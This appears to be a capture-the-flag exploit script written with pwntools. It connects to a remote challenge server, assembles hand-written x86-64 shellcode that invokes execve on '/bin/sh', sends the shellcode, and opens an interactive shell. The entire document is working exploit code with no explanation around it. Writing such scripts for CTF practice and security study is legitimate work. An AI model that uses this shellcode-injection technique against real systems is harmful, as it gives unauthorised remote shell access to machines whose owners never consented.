from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10116)
shellcode = asm('''
xor rax,rax
xor rdi,rdi
mov rdi ,0x68732f6e69622f
push rdi              
push rsp                 
pop rdi
xor rsi,rsi
xor rdx,rdx
push 0x3b   
pop rax
syscall
''')
# shellcode = asm(shellcraft.sh())
io.sendline(shellcode)
io.interactive()